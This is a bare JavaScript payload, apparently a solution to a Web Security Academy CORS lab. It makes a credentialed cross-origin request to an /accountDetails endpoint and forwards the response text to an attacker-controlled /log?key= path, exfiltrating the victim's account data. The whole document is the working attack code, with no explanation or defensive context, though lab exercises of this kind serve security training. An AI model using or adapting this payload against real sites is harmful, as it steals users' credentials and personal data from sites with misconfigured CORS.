var xhr = new XMLHttpRequest();
xhr.onload = reqListener;
xhr.open('get','https://0a1b00cd047d7111883b57c8005100ec.web-security-academy.net/accountDetails',true);
xhr.withCredentials = true;
xhr.send();

function reqListener() {
    location='/log?key='+this.responseText;
};
